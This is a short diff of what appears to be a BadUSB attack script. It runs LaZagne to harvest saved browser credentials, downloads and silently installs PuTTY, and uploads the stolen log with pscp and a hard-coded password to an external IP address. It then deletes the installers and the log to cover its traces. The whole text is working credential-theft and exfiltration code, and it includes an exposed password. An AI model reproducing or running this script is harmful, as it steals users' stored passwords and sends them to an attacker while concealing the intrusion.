@@ -20,5 +20,16 @@ cd Windows
 
 python laZagne.py browsers > logs.txt
 
-scp logs.txt badusb@51.83.71.188:/home/mike/Desktop
+curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/putty-64bit-0.78-installer.msi
 
+msiexec /i putty-64bit-0.78-installer.msi /qn
+
+pscp -pw lolmdr123 logs.txt badusb@51.83.71.188:/var/tmp
+
+del putty-64bit-0.78-installer.msi
+del logs.txt
+
+cd ..
+cd ..
+
+del python-3.9.9-amd64.exe
